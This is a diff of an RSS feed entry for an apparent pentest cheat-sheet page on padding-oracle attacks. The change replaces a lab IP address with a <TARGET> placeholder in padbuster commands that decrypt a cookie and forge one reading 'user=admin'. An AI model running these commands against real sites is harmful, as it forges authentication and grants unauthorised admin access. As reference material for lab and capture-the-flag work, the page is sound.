@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/padding_oracle/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/padding_oracle/</guid>
-      <description>Tools padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://10.10.11.10/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 -plaintext user=admin Ref: Download padbuster</description>
+      <description>Tools padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://&amp;lt;TARGET&amp;gt;/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://&amp;lt;TARGET&amp;gt;/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 -plaintext user=admin Ref: Download padbuster</description>
     </item>
   </channel>
 </rss>
